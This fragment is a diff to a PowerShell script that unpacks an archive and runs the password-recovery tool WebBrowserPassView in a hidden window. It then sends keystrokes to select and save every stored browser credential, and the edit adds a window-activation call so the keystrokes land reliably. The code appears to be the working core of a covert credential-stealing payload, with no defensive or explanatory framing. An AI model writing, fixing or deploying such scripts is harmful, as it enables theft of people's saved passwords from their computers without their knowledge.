@@ -10,7 +10,8 @@ Expand-Archive 7z.zip
 Start-Sleep -Seconds 5
 Start-Process -FilePath .\WebBrowserPassView.exe -Wait -WindowStyle Hidden
 
-$WShell = New-Object -com "Wscript.Shell"
+$WShell = New-Object -com wscript.shell
+$Wshell.AppActivate('WebBrowserPassView')
 $WShell.sendkeys("{^}a")
 Start-Sleep -Seconds 2
 $WShell.sendkeys("{^}s")
